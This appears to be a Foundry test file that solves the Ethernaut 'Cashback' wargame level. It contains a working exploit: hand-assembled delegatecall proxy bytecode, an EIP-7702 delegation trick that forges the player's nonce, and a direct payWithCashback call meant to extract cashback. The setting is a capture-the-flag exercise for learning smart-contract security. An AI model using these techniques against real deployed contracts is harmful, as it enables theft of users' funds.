// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {Cashback, Currency} from "src/levels/Cashback.sol";
import {CashbackFactory, SuperCashbackNFT} from "src/levels/CashbackFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {CashbackAttack, CashbackProxyDeployer, CashbackAttackNonceSetter} from "../../src/attacks/CashbackAttack.sol";

contract TestCashback is Test, Utils {
    Ethernaut ethernaut;
    Cashback instance;
    CashbackFactory factory;

    address payable owner;
    address player;
    uint256 playerKey;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/
    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        (player, playerKey) = makeAddrAndKey("Player");
        vm.deal(player, 1 ether);

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        factory = new CashbackFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = Cashback(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        // Assert Cashback Rates
        assertEq(instance.cashbackRates(Currency.wrap(address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE))), 50);
        assertEq(instance.cashbackRates(Currency.wrap(address(factory.FREE()))), 200);
        assertEq(instance.maxCashback(Currency.wrap(address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE))), 1 ether);
        assertEq(instance.maxCashback(Currency.wrap(address(factory.FREE()))), 500 ether);

        assertEq(SuperCashbackNFT(instance.superCashbackNFT()).owner(), address(instance));
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    function testSolve() public checkSolvedByPlayer{
        // Expected Cashback flow:
        // delegate player to Cashback, then send a self-call:
        // player calls payWithCashback on player itself.
        // payWithCashback performs the transfer and then triggers accrueCashback.
//        vm.signAndAttachDelegation(address(instance), playerKey);
//        player.call(abi.encodeCall(instance.payWithCashback, (Currency.wrap(address(factory.FREE())), player, 100)));

        // Attack idea:
        // try to call accrueCashback directly (without doing a real transfer).

        CashbackAttack attackerImp = new CashbackAttack();
        bytes memory attackerProxyRuntimeCode = bytes.concat(
            // PUSH1 0x17; JUMP
            hex"601756",
            abi.encodePacked(address(instance)),
            // JUMPDEST
            hex"5B",
            //delegate call to attacker
            /*
                calldatacopy(0, 0, calldatasize())
                let ok := delegatecall(gas(), address(attacker), 0, calldatasize(), 0, 0)
                returndatacopy(0, 0, returndatasize())
                switch ok
                case 0 { revert(0, returndatasize()) }
                default { return(0, returndatasize()) }
             */
            hex"363d3d373d3d3d363d73", abi.encodePacked(address(attackerImp)), hex"5af43d82803e903d91604357fd5bf3"//
        );

//        bytes memory attackProxyCreateCode = _buildCreateCode(attackerProxyRuntimeCode);
//        address attackerProxyDeployed;
//        assembly {
//            attackerProxyDeployed := create(0, add(attackProxyCreateCode, 0x20), mload(attackProxyCreateCode))
//        }
//        require(attackerProxyDeployed != address(0), "deploy failed");

        CashbackProxyDeployer attackerProxy = new CashbackProxyDeployer(attackerProxyRuntimeCode);
        address attackerProxyDeployed = address(attackerProxy);

        CashbackAttack attacker = CashbackAttack(attackerProxyDeployed);
        attacker.attack(instance, address(factory.FREE()), player);


        CashbackAttackNonceSetter nonceSetter = new CashbackAttackNonceSetter();
        vm.signAndAttachDelegation(address(nonceSetter), playerKey);
        CashbackAttackNonceSetter(payable(player)).setNonce(9999);

        vm.signAndAttachDelegation(address(instance), playerKey);
        Cashback(payable(player)).payWithCashback(
            Currency.wrap(address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE)),
            player,
            1
        );
    }
    function _buildCreateCode(bytes memory runtimeCode) internal pure returns (bytes memory) {
        require(runtimeCode.length <= type(uint16).max, "runtime too large");

        // 61 <len2> 80 60 0b 5f 39 5f f3 fe
        // PUSH2 len | DUP1 | PUSH1 0x0b | PUSH0 | CODECOPY | PUSH0 | RETURN | INVALID
        bytes memory prefix = bytes.concat(
            hex"61",
            bytes2(uint16(runtimeCode.length)),
            hex"80600b5f395ff3fe"
        );

        return bytes.concat(prefix, runtimeCode);
    }
}
